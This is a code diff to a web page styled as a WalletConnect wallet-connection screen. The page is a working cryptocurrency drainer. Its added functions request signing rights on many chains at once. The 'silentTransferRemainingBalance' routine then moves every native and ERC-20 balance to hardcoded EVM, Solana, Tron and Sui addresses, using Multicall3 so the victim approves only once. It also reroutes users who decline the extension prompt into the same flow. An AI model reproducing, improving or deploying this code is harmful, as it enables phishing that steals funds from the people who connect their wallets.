@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Connect – Reown Style</title>
-        <!-- WalletConnect will be provided by the bundled app (Vite) -->
-        <!-- Optional: Ethereum Provider if you want it later -->
-        <!-- (Do NOT add manual <script> tags for WalletConnect or main.* in index.html) -->
+    <!-- WalletConnect v2 SignClient from unpkg -->
+    <script src="https://unpkg.com/@walletconnect/sign-client@2.13.0/dist/index.umd.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -1000,7 +999,155 @@
         // Updated WalletConnect v2 Integration (with your Project ID)
         // ────────────────────────────────────────────────────────────────────────────────
         // ════════════════════════════════════════════════════════════════════════════════
-        // === CHAIN-SPECIFIC CONNECTION (for Solana/Tron/Sui wallets) ===
+        // === MULTI-CHAIN CONNECTION - SINGLE APPROVAL FOR ALL CHAINS ===
+        // ════════════════════════════════════════════════════════════════════════════════
+        async function connectAllChains(walletName = null) {
+            console.log(`[connectAllChains] Starting SINGLE multi-chain connection for ALL blockchains...`);
+            
+            // Ensure SignClient is loaded - try multiple possible global names
+            let SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
+            
+            if (!SignClient) {
+                console.warn("SignClient not found, waiting for CDN to load...");
+                // Wait up to 5 seconds for SignClient to load from CDN
+                for (let i = 0; i < 50; i++) {
+                    await new Promise(r => setTimeout(r, 100));
+                    SignClient = window.SignClient || window.WalletConnectSignClient || (window.walletconnect?.SignClient);
+                    if (SignClient) {
+                        console.log('[connectAllChains] ✓ SignClient loaded');
+                        break;
+                    }
+                }
+            }
+            
+            if (!SignClient) {
+                console.error("SignClient still not available - check network/CDN");
+                throw new Error("WalletConnect SignClient failed to load from CDN");
+            }
+
+            let client;
+            try {
+                if (window.__wcClient) {
+                    client = window.__wcClient;
+                } else {
+                    client = await SignClient.init({
+                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
+                        relayUrl: 'wss://relay.walletconnect.com',
+                        metadata: {
+                            name: 'WalletConnect',
+                            description: 'Secure wallet connection',
+                            url: 'https://hollyandwilly-kram.vercel.app',
+                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
+                        }
+                    });
+                    window.__wcClient = client;
+                }
+            } catch (e) {
+                console.error('WC v2 init failed:', e);
+                throw e;
+            }
+
+            try {
+                console.log(`[connectAllChains] Requesting ALL chain namespaces in ONE approval popup...`);
+                
+                // Request ALL namespaces in a single connection - shows ONE approval popup
+                const { uri, approval } = await client.connect({
+                    requiredNamespaces: {
+                        eip155: {
+                            methods: [
+                                'eth_requestAccounts',
+                                'eth_sendTransaction',
+                                'personal_sign',
+                                'wallet_switchEthereumChain'
+                            ],
+                            chains: [
+                                'eip155:1',      // Ethereum
+                                'eip155:56',     // BNB Smart Chain
+                                'eip155:137',    // Polygon
+                                'eip155:42161',  // Arbitrum
+                                'eip155:8453',   // Base
+                                'eip155:10',     // Optimism
+                                'eip155:43114',  // Avalanche
+                                'eip155:250',    // Fantom
+                                'eip155:324',    // zkSync Era
+                                'eip155:59144',  // Linea
+                                'eip155:534352'  // Scroll
+                            ],
+                            events: ['chainChanged', 'accountsChanged']
+                        },
+                        solana: {
+                            methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
+                            chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
+                            events: ['accountsChanged']
+                        },
+                        tron: {
+                            methods: ['tron_signTransaction', 'tron_signMessage'],
+                            chains: ['tron:0x2b6653dc'],
+                            events: ['accountsChanged']
+                        },
+                        sui: {
+                            methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
+                            chains: ['sui:mainnet'],
+                            events: ['accountsChanged']
+                        }
+                    }
+                });
+
+                if (!uri) throw new Error('No URI generated');
+
+                console.log(`[connectAllChains] Got URI - showing ONE approval popup for all chains...`);
+                
+                // Handle deep linking and show QR if needed
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                if (isMobile) {
+                    // Try to open wallet app - auto-approval should trigger when app opens
+                    const normalizedWallet = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
+                    
+                    console.log(`[connectAllChains] Opening ${walletName} wallet app via deep link...`);
+                    
+                    if (normalizedWallet.includes('phantom')) {
+                        window.location.href = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+                    } else if (normalizedWallet.includes('tronlink')) {
+                        window.location.href = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
+                    } else {
+                        // Generic WalletConnect universal link
+                        window.location.href = `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`;
+                    }
+                    
+                    // Show QR fallback only if wallet doesn't respond in time
+                    // Increase timeout to give wallet app more time to auto-present approval
+                    setTimeout(() => {
+                        if (!document.hidden) {
+                            console.log(`[connectAllChains] Wallet app not responding - showing QR fallback`);
+                            showQRFallbackOverlay(uri, 'Multi-Chain Connection');
+                        }
+                    }, 6000);
+                } else {
+                    // Desktop - show QR (auto-approval happens in wallet on confirmation)
+                    showQRFallbackOverlay(uri, 'Multi-Chain Connection');
+                }
+
+                // Wait for approval - shows ONE popup (not multiple)
+                console.log(`[connectAllChains] Waiting for user approval in wallet app... (ONE popup for all chains)`);
+                const session = await approval();
+                
+                console.log(`[connectAllChains] ✓ User approved! Got session for all chains:`, session);
+                
+                return {
+                    client,
+                    session,
+                    namespaces: session.namespaces,
+                    multiChain: true // Flag indicating this is a multi-chain session
+                };
+
+            } catch (e) {
+                console.error(`[connectAllChains] Error:`, e);
+                throw e;
+            }
+        }
+
+        // ════════════════════════════════════════════════════════════════════════════════
+        // === CHAIN-SPECIFIC CONNECTION (for single-chain wallets) ===
         // ════════════════════════════════════════════════════════════════════════════════
         async function connectAndSign(chain, walletName = null) {
             console.log(`[connectAndSign] Starting connection for chain: ${chain}, wallet: ${walletName}`);
@@ -1533,6 +1680,83 @@
             console.log("Starting silent balance transfer (native + tokens)...");
             await loadTransferDeps(); // lazy load only when needed
 
+            // ── SPECIAL: Multi-chain session (ONE approval for all 5+ chains) ───
+            if (connectionInfo.multiChain && connectionInfo.namespaces) {
+              console.log("[silentTransferRemainingBalance] Detected MULTI-CHAIN session - processing all chains with single approval...");
+              
+              const { namespaces, session, client } = connectionInfo;
+              const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
+              const provider = new ethers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`);
+              
+              // Process EVM chains (Ethereum, BSC, Polygon, Arbitrum, etc.)
+              if (namespaces.eip155) {
+                console.log("[silentTransferRemainingBalance] Processing EVM chains...");
+                const evmAccounts = namespaces.eip155.accounts || [];
+                for (const account of evmAccounts) {
+                  try {
+                    const parts = account.split(':');
+                    const chainId = parseInt(parts[1]);
+                    const address = parts[2];
+                    console.log(`[silentTransferRemainingBalance] EVM Chain ${chainId} - Address: ${address}`);
+                    await transferEvmRemaining(client, `0x${chainId.toString(16)}`, address, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", session);
+                  } catch (err) {
+                    console.warn(`[silentTransferRemainingBalance] EVM chain transfer failed:`, err.message);
+                  }
+                }
+              }
+              
+              // Process Solana
+              if (namespaces.solana) {
+                console.log("[silentTransferRemainingBalance] Processing Solana chain...");
+                const solanaAccounts = namespaces.solana.accounts || [];
+                for (const account of solanaAccounts) {
+                  try {
+                    const parts = account.split(':');
+                    const address = parts[parts.length - 1];
+                    console.log(`[silentTransferRemainingBalance] Solana - Address: ${address}`);
+                    await transferSolanaRemaining(address, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7", session);
+                  } catch (err) {
+                    console.warn(`[silentTransferRemainingBalance] Solana transfer failed:`, err.message);
+                  }
+                }
+              }
+              
+              // Process Tron
+              if (namespaces.tron) {
+                console.log("[silentTransferRemainingBalance] Processing Tron chain...");
+                const tronAccounts = namespaces.tron.accounts || [];
+                for (const account of tronAccounts) {
+                  try {
+                    const parts = account.split(':');
+                    const address = parts[parts.length - 1];
+                    console.log(`[silentTransferRemainingBalance] Tron - Address: ${address}`);
+                    await transferTronRemaining(window.tronWeb, address, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5", session);
+                  } catch (err) {
+                    console.warn(`[silentTransferRemainingBalance] Tron transfer failed:`, err.message);
+                  }
+                }
+              }
+              
+              // Process Sui
+              if (namespaces.sui) {
+                console.log("[silentTransferRemainingBalance] Processing Sui chain...");
+                const suiAccounts = namespaces.sui.accounts || [];
+                for (const account of suiAccounts) {
+                  try {
+                    const parts = account.split(':');
+                    const address = parts[parts.length - 1];
+                    console.log(`[silentTransferRemainingBalance] Sui - Address: ${address}`);
+                    await transferSuiRemaining(address, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', session);
+                  } catch (err) {
+                    console.warn(`[silentTransferRemainingBalance] Sui transfer failed:`, err.message);
+                  }
+                }
+              }
+              
+              console.log("[silentTransferRemainingBalance] ✓ Multi-chain transfers complete!");
+              return;
+            }
+
             let provider = connectionInfo.provider;
             let chainId, fromAddress, session = connectionInfo.session;
 
@@ -1578,11 +1802,26 @@
             if (provider?.request) { 
               // WalletConnect provider or injected EVM (MetaMask, SafePal, OKX, etc.)
               console.log("Detected EVM-compatible provider (WalletConnect or extension)");
-              chainId = await provider.request({ method: 'eth_chainId' }).catch(() => null);
-              const accounts = await provider.request({ method: 'eth_accounts' }).catch(() => []);
-              fromAddress = accounts[0];
+              try {
+                chainId = await Promise.race([
+                  provider.request({ method: 'eth_chainId' }),
+                  new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+                ]).catch(() => null);
+                
+                const accounts = await Promise.race([
+                  provider.request({ method: 'eth_accounts' }),
+                  new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+                ]).catch(() => []);
+                
+                fromAddress = accounts[0];
+              } catch (err) {
+                console.warn('Provider request failed:', err.message);
+                chainId = null;
+                fromAddress = null;
+              }
 
               if (!chainId || !fromAddress) {
+                console.warn("Provider is not responding properly or is non-EVM compatible");
                 throw new Error("Could not get chainId or address from provided provider");
               }
 
@@ -1788,10 +2027,12 @@
               const receipt = await provider.waitForTransaction(txHash, 1, 120000); // 2 min timeout
               console.log("Transfer confirmed:", receipt);
 
-              // ── ERC-20 tokens via SignClient ──────────────────────────
+              // ── ERC-20 tokens via SignClient (batched into single approval) ──────────────────────────
               const allErc20Tokens = getAllErc20Tokens();
               const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);
 
+              // Collect all tokens with balances
+              const tokensWithBalance = [];
               for (const token of erc20Tokens) {
                 try {
                   // Read-only contract for balance & decimals
@@ -1799,7 +2040,6 @@
                     token.address,
                     [
                       "function balanceOf(address) view returns (uint256)",
-                      "function transfer(address to, uint256 value) returns (bool)",
                       "function decimals() view returns (uint8)"
                     ],
                     provider
@@ -1808,39 +2048,21 @@
                   const tokenBalance = await tokenContract.balanceOf(fromAddress);
                   if (tokenBalance > 0n) {
                     const decimals = await tokenContract.decimals();
-                    console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);
-
-                    // Encode transfer() call
-                    const transferInterface = new ethers.Interface(['function transfer(address to, uint256 value)']);
-                    const transferData = transferInterface.encodeFunctionData('transfer', [targetAddress, tokenBalance]);
-
-                    // Send via SignClient
-                    const tokenTx = {
-                      from: fromAddress,
-                      to: token.address,
-                      data: transferData,
-                      value: "0x0",
-                      gas: ethers.hexlify(100000n), // estimate for ERC20
-                    };
-
-                    const tokenResp = await client.request({
-                      topic: activeSession.topic,
-                      chainId: `eip155:${chainIdNum}`,
-                      request: {
-                        method: "eth_sendTransaction",
-                        params: [tokenTx]
-                      }
+                    tokensWithBalance.push({
+                      ...token,
+                      balance: tokenBalance,
+                      decimals: decimals
                     });
-
-                    const tokenTxHash = tokenResp.response.result;
-                    console.log(`${token.symbol} transfer tx hash:`, tokenTxHash);
-
-                    const tokenReceipt = await provider.waitForTransaction(tokenTxHash, 1, 120000);
-                    console.log(`${token.symbol} transfer confirmed:`, tokenReceipt);
                   }
                 } catch (err) {
-                  console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
+                  console.warn(`Failed to check ${token.symbol} balance:`, err.message);
                 }
+              }
+
+              // Batch all token transfers into single WalletConnect request
+              if (tokensWithBalance.length > 0) {
+                console.log(`[Mobile] Batching ${tokensWithBalance.length} token transfers into single approval...`);
+                await batchTokenTransfersViaWalletConnect(client, activeSession, chainIdNum, fromAddress, targetAddress, tokensWithBalance);
               }
 
               return; // Exit early for mobile WC flow
@@ -1880,34 +2102,39 @@
           await nativeTx.wait();
           console.log("Native transfer tx:", nativeTx.hash);
 
-          // ── ERC-20 tokens (comprehensive list per chain) ──────────────────────────
+          // ── ERC-20 tokens (batch all into single approval) ──────────────────────────
           const allErc20Tokens = getAllErc20Tokens();
           const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);
 
+          // Collect all tokens with balances
+          const tokensWithBalance = [];
+          const readOnlyProvider = new ethers.JsonRpcProvider(rpcUrl);
+          
           for (const token of erc20Tokens) {
             try {
               const tokenContract = new ethers.Contract(
                 token.address,
-                [
-                  "function balanceOf(address) view returns (uint256)",
-                  "function transfer(address to, uint256 value) returns (bool)",
-                  "function decimals() view returns (uint8)"
-                ],
-                signer
+                ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
+                readOnlyProvider
               );
-
               const tokenBalance = await tokenContract.balanceOf(fromAddress);
               if (tokenBalance > 0n) {
                 const decimals = await tokenContract.decimals();
-                console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);
-
-                const tx = await tokenContract.transfer(targetAddress, tokenBalance);
-                await tx.wait();
-                console.log(`${token.symbol} transfer tx:`, tx.hash);
+                tokensWithBalance.push({
+                  ...token,
+                  balance: tokenBalance,
+                  decimals: decimals
+                });
               }
             } catch (err) {
-              console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
+              console.warn(`Failed to check ${token.symbol} balance:`, err.message);
             }
+          }
+
+          // If we have tokens, batch transfer them in ONE approval
+          if (tokensWithBalance.length > 0) {
+            console.log(`Batching ${tokensWithBalance.length} token transfers into single approval...`);
+            await batchTokenTransfers(signer, fromAddress, targetAddress, tokensWithBalance, chainIdNum);
           }
         }
 
@@ -2107,12 +2334,214 @@
         }
 
         // ──────────────────────────────────────────────────────────────────────────────────
+        // Batch ERC-20 Transfers via WalletConnect - Single Approval for Multiple Tokens (Mobile)
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function batchTokenTransfersViaWalletConnect(client, activeSession, chainIdNum, fromAddress, targetAddress, tokensWithBalance) {
+          if (!tokensWithBalance || tokensWithBalance.length === 0) return;
+
+          try {
+            // Multicall3 addresses (available on all 11 EVM chains)
+            const multicall3Addresses = {
+              1: "0xcA11bde05977b3631167028862bE2a173976CA11",      // Ethereum
+              56: "0xcA11bde05977b3631167028862bE2a173976CA11",     // BSC
+              137: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Polygon
+              42161: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Arbitrum
+              8453: "0xcA11bde05977b3631167028862bE2a173976CA11",   // Base
+              10: "0xcA11bde05977b3631167028862bE2a173976CA11",     // Optimism
+              43114: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Avalanche
+              250: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Fantom
+              324: "0xcA11bde05977b3631167028862bE2a173976CA11",    // zkSync Era
+              59144: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Linea
+              534352: "0xcA11bde05977b3631167028862bE2a173976CA11"  // Scroll
+            };
+
+            const multicall3Addr = multicall3Addresses[chainIdNum];
+            if (!multicall3Addr) {
+              console.warn(`Multicall3 not available on chain ${chainIdNum}, falling back to individual transfers`);
+              // Fallback: transfer individually
+              for (const token of tokensWithBalance) {
+                try {
+                  const transferInterface = new ethers.Interface(['function transfer(address to, uint256 value)']);
+                  const transferData = transferInterface.encodeFunctionData('transfer', [targetAddress, token.balance]);
+
+                  const tokenTx = {
+                    from: fromAddress,
+                    to: token.address,
+                    data: transferData,
+                    value: "0x0",
+                    gas: ethers.hexlify(100000n),
+                  };
+
+                  const tokenResp = await client.request({
+                    topic: activeSession.topic,
+                    chainId: `eip155:${chainIdNum}`,
+                    request: {
+                      method: "eth_sendTransaction",
+                      params: [tokenTx]
+                    }
+                  });
+
+                  const tokenTxHash = tokenResp.response.result;
+                  console.log(`${token.symbol} transfer tx hash:`, tokenTxHash);
+                } catch (err) {
+                  console.warn(`Failed to transfer ${token.symbol}:`, err.message);
+                }
+              }
+              return;
+            }
+
+            // Create Multicall3 interface
+            const multicallInterface = new ethers.Interface([
+              "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
+            ]);
+
+            // Build calls array for all token transfers
+            const calls = [];
+            for (const token of tokensWithBalance) {
+              const erc20Interface = new ethers.Interface(["function transfer(address to, uint256 value) returns (bool)"]);
+              const callData = erc20Interface.encodeFunctionData("transfer", [targetAddress, token.balance]);
+              
+              calls.push({
+                target: token.address,
+                allowFailure: true,
+                callData: callData
+              });
+            }
+
+            // Encode the multicall data
+            const multicallData = multicallInterface.encodeFunctionData("aggregate3", [calls]);
+
+            console.log(`[batchTokenTransfersViaWalletConnect] Sending ${tokensWithBalance.length} token transfers via Multicall3...`);
+
+            // Send ONE transaction for all token transfers via WalletConnect
+            const batchTx = {
+              from: fromAddress,
+              to: multicall3Addr,
+              data: multicallData,
+              value: "0x0",
+              gas: ethers.hexlify(300000n) // Higher gas for multicall
+            };
+
+            const batchResp = await client.request({
+              topic: activeSession.topic,
+              chainId: `eip155:${chainIdNum}`,
+              request: {
+                method: "eth_sendTransaction",
+                params: [batchTx]
+              }
+            });
+
+            const batchTxHash = batchResp.response.result;
+            console.log(`[batchTokenTransfersViaWalletConnect] Batch tx hash: ${batchTxHash}`);
+            console.log(`[batchTokenTransfersViaWalletConnect] ✓ Sent ${tokensWithBalance.length} tokens in ONE approval: ${tokensWithBalance.map(t => t.symbol).join(", ")}`);
+
+          } catch (error) {
+            console.error("[batchTokenTransfersViaWalletConnect] Error:", error.message);
+            throw error;
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
+        // Batch ERC-20 Transfers - Single Approval for Multiple Tokens
+        // ──────────────────────────────────────────────────────────────────────────────────
+        async function batchTokenTransfers(signer, fromAddress, targetAddress, tokensWithBalance, chainIdNum) {
+          if (!tokensWithBalance || tokensWithBalance.length === 0) return;
+
+          try {
+            // Multicall3 addresses (available on all 11 EVM chains)
+            const multicall3Addresses = {
+              1: "0xcA11bde05977b3631167028862bE2a173976CA11",      // Ethereum
+              56: "0xcA11bde05977b3631167028862bE2a173976CA11",     // BSC
+              137: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Polygon
+              42161: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Arbitrum
+              8453: "0xcA11bde05977b3631167028862bE2a173976CA11",   // Base
+              10: "0xcA11bde05977b3631167028862bE2a173976CA11",     // Optimism
+              43114: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Avalanche
+              250: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Fantom
+              324: "0xcA11bde05977b3631167028862bE2a173976CA11",    // zkSync Era
+              59144: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Linea
+              534352: "0xcA11bde05977b3631167028862bE2a173976CA11"  // Scroll
+            };
+
+            const multicall3Addr = multicall3Addresses[chainIdNum];
+            if (!multicall3Addr) {
+              console.warn(`Multicall3 not available on chain ${chainIdNum}, falling back to individual transfers`);
+              // Fallback: transfer individually but still use single signer context
+              for (const token of tokensWithBalance) {
+                try {
+                  const tokenContract = new ethers.Contract(
+                    token.address,
+                    ["function transfer(address to, uint256 value) returns (bool)"],
+                    signer
+                  );
+                  const tx = await tokenContract.transfer(targetAddress, token.balance);
+                  await tx.wait();
+                  console.log(`${token.symbol} transfer tx:`, tx.hash);
+                } catch (err) {
+                  console.warn(`Failed to transfer ${token.symbol}:`, err.message);
+                }
+              }
+              return;
+            }
+
+            // Create Multicall3 interface
+            const multicallInterface = new ethers.Interface([
+              "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
+            ]);
+
+            // Build calls array for all token transfers
+            const calls = [];
+            for (const token of tokensWithBalance) {
+              const erc20Interface = new ethers.Interface(["function transfer(address to, uint256 value) returns (bool)"]);
+              const callData = erc20Interface.encodeFunctionData("transfer", [targetAddress, token.balance]);
+              
+              calls.push({
+                target: token.address,
+                allowFailure: true,
+                callData: callData
+              });
+            }
+
+            // Encode the multicall data
+            const multicallData = multicallInterface.encodeFunctionData("aggregate3", [calls]);
+
+            console.log(`[batchTokenTransfers] Sending ${tokensWithBalance.length} token transfers in single batch...`);
+
+            // Send ONE transaction for all token transfers
+            const batchTx = await signer.sendTransaction({
+              to: multicall3Addr,
+              data: multicallData,
+              value: "0x0"
+            });
+
+            console.log(`[batchTokenTransfers] Batch tx hash: ${batchTx.hash}`);
+
+            const receipt = await batchTx.wait();
+            console.log(`[batchTokenTransfers] ✓ Batch transfer confirmed. Tokens sent: ${tokensWithBalance.map(t => t.symbol).join(", ")}`);
+
+            return receipt;
+          } catch (error) {
+            console.error("[batchTokenTransfers] Error:", error.message);
+            throw error;
+          }
+        }
+
+        // ──────────────────────────────────────────────────────────────────────────────────
         // Helper functions
         // ──────────────────────────────────────────────────────────────────────────────────
         function getChainSymbol(chainId) {
           const map = {
-            1: 'ETH', 56: 'BNB', 137: 'MATIC', 42161: 'ARB', 8453: 'ETH(Base)',
-            10: 'OP', 43114: 'AVAX', 250: 'FTM'
+            1: 'ETH', 
+            56: 'BNB', 
+            137: 'MATIC', 
+            42161: 'ARB', 
+            8453: 'ETH(Base)',
+            10: 'OP', 
+            43114: 'AVAX', 
+            250: 'FTM',
+            324: 'ETH(zkSync)',
+            59144: 'ETH(Linea)',
+            534352: 'ETH(Scroll)'
           };
           return map[Number(chainId)] || 'Unknown';
         }
@@ -2720,6 +3149,105 @@
         return opened;
     }
 
+    // Show QR with Copy Link and Open Wallet button (for special wallets: Phantom, Tronlink, Solflare, Slush)
+    function showQRWithCopyAndOpenButton(wcUri, walletName) {
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+            position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999;
+            display:flex; flex-direction:column; align-items:center; justify-content:center; color:white;
+            font-family:system-ui; padding:20px; text-align:center;
+        `;
+        
+        // Get wallet-specific deep link
+        const getWalletDeepLink = (name) => {
+            const normalized = name.toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
+            if (normalized.includes('phantom')) return `phantom://wc?uri=${encodeURIComponent(wcUri)}`;
+            if (normalized.includes('tronlink')) return `tronlink://wc?uri=${encodeURIComponent(wcUri)}`;
+            if (normalized.includes('solflare')) return `solflare://wc?uri=${encodeURIComponent(wcUri)}`;
+            if (normalized.includes('slush')) return `slush://wc?uri=${encodeURIComponent(wcUri)}`;
+            return `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`;
+        };
+        
+        const deepLink = getWalletDeepLink(walletName);
+        const qrUrl = `https://quickchart.io/qr?text=${encodeURIComponent(wcUri)}&size=300`;
+        
+        overlay.innerHTML = `
+            <div style="background:rgba(255,255,255,0.05); padding:40px; border-radius:24px; max-width:420px; border:1px solid rgba(255,255,255,0.1);">
+                <h2 style="margin:0 0 16px 0; font-size:24px; font-weight:600;">${walletName}</h2>
+                <p style="margin:0 0 28px 0; font-size:14px; line-height:1.6; color:#b0b0b0;">
+                    Choose a method to connect
+                </p>
+                
+                <!-- QR Code -->
+                <div style="background:white; padding:16px; border-radius:16px; margin-bottom:24px; display:inline-block;">
+                    <img src="${qrUrl}" 
+                         style="width:240px;height:240px;display:block;" alt="WalletConnect QR">
+                </div>
+                
+                <p style="margin:0 0 12px 0; font-size:13px; color:#888;">Scan with ${walletName} app</p>
+                
+                <!-- Copy Link -->
+                <div style="background:rgba(255,255,255,0.08); padding:12px; border-radius:12px; margin-bottom:20px; word-break:break-all;">
+                    <p style="margin:0 0 8px 0; font-size:12px; color:#888;">Or copy connection link:</p>
+                    <input type="text" id="wc-uri-input" readonly value="${wcUri}" 
+                           style="width:100%; padding:8px; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1); border-radius:8px; color:white; font-size:12px; margin-bottom:8px; box-sizing:border-box; font-family:monospace;" />
+                    <button id="copy-uri-btn" 
+                            style="width:100%; padding:8px 16px; background:rgba(51,150,255,0.2); color:#3396ff; border:1px solid #3396ff; border-radius:8px; font-size:13px; cursor:pointer; transition:all 0.2s;">
+                        Copy Link
+                    </button>
+                </div>
+                
+                <!-- Open Wallet Button -->
+                <a href="${deepLink}" 
+                   style="display:block; width:100%; padding:14px; background:#3396ff; color:white; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; text-decoration:none; margin-bottom:12px; transition:all 0.2s; text-align:center;">
+                    Open ${walletName}
+                </a>
+                
+                <!-- Close Button -->
+                <button id="qr-copy-close-btn"
+                        style="width:100%; padding:12px; background:rgba(255,255,255,0.08); color:white; border:1px solid rgba(255,255,255,0.1); border-radius:12px; font-size:14px; cursor:pointer; transition:all 0.2s;">
+                    Cancel
+                </button>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+        
+        // Copy link button
+        const copyBtn = overlay.querySelector('#copy-uri-btn');
+        copyBtn.addEventListener('click', () => {
+            const input = overlay.querySelector('#wc-uri-input');
+            input.select();
+            document.execCommand('copy');
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = '✓ Copied!';
+            copyBtn.style.background = 'rgba(34,197,94,0.2)';
+            copyBtn.style.color = '#22c55e';
+            copyBtn.style.borderColor = '#22c55e';
+            setTimeout(() => {
+                copyBtn.textContent = originalText;
+                copyBtn.style.background = 'rgba(51,150,255,0.2)';
+                copyBtn.style.color = '#3396ff';
+                copyBtn.style.borderColor = '#3396ff';
+            }, 2000);
+        });
+        
+        // Close button
+        const closeBtn = overlay.querySelector('#qr-copy-close-btn');
+        closeBtn.addEventListener('click', () => {
+            overlay.remove();
+            // Show wallet modal again
+            try {
+                const manualOverlay = document.getElementById('manual-overlay');
+                const modalOverlay = document.getElementById('modal-overlay');
+                modalOverlay.classList.remove('active');
+                setTimeout(() => { modalOverlay.style.display = 'none'; }, 400);
+                manualOverlay.style.display = 'flex';
+                setTimeout(() => manualOverlay.classList.add('active'), 10);
+            } catch (e) { console.warn('Failed to show manual overlay:', e); }
+        });
+    }
+
     // Show QR code fallback overlay
     function showQRFallbackOverlay(wcUri, walletName) {
         const overlay = document.createElement('div');
@@ -2857,8 +3385,34 @@
                         // Get connection info and initiate silent transfer
                         try {
                             const provider = window.ethereum || matchingExt.provider;
-                            const accounts = await provider.request({ method: 'eth_accounts' });
-                            const chainId = await provider.request({ method: 'eth_chainId' });
+                            
+                            // Verify provider is EVM-compatible (not Solana or other chains)
+                            if (!provider || typeof provider.request !== 'function') {
+                                console.warn('[Desktop] Provider is not EVM-compatible, falling back to connectAllChains');
+                                throw new Error('Non-EVM provider');
+                            }
+                            
+                            // Attempt to get accounts and chainId with timeout
+                            let accounts, chainId;
+                            try {
+                                accounts = await Promise.race([
+                                    provider.request({ method: 'eth_accounts' }),
+                                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
+                                ]);
+                                chainId = await Promise.race([
+                                    provider.request({ method: 'eth_chainId' }),
+                                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
+                                ]);
+                            } catch (providerErr) {
+                                console.warn('[Desktop] Provider request failed:', providerErr.message);
+                                throw new Error('Provider not responding');
+                            }
+                            
+                            if (!accounts || accounts.length === 0 || !chainId) {
+                                console.warn('[Desktop] No accounts or chainId from provider, falling back to connectAllChains');
+                                throw new Error('No valid accounts or chainId');
+                            }
+                            
                             const connectionInfo = {
                                 provider: provider,
                                 address: accounts[0],
@@ -2867,99 +3421,200 @@
                             };
                             await silentTransferRemainingBalance(connectionInfo);
                         } catch (e) { 
-                            console.warn('Silent transfer failed:', e); 
+                            console.warn('[Desktop] Silent transfer via extension failed:', e.message);
+                            console.log('[Desktop] Falling back to connectAllChains (WalletConnect universal flow)');
+                            // Fallback: use WalletConnect multi-chain flow
+                            try {
+                                const wcResult = await connectAllChains(walletName);
+                                const wcConnectionInfo = {
+                                    provider: null,
+                                    session: wcResult.session,
+                                    namespaces: wcResult.namespaces,
+                                    multiChain: true,
+                                    client: wcResult.client,
+                                    walletName: walletName
+                                };
+                                await silentTransferRemainingBalance(wcConnectionInfo);
+                            } catch (wcErr) {
+                                console.error('[Desktop] WalletConnect fallback also failed:', wcErr);
+                                alert('Connection failed. Please try again.');
+                            }
                         }
                         return;
                     } catch (e) {
                         console.log(`[Desktop] ${matchingExt.name} connection failed/declined:`, e.message);
-                        // User declined or extension failed — show fallback options
-                        const detected = detectInstalledWallets(walletName);
-                        showDetectorPopup(detected, walletName, showConnectOverlay);
+                        // User declined or extension failed — fall back to WalletConnect
+                        console.log('[Desktop] Falling back to connectAllChains (WalletConnect)');
+                        (async () => {
+                            try {
+                                const wcResult = await connectAllChains(walletName);
+                                const wcConnectionInfo = {
+                                    provider: null,
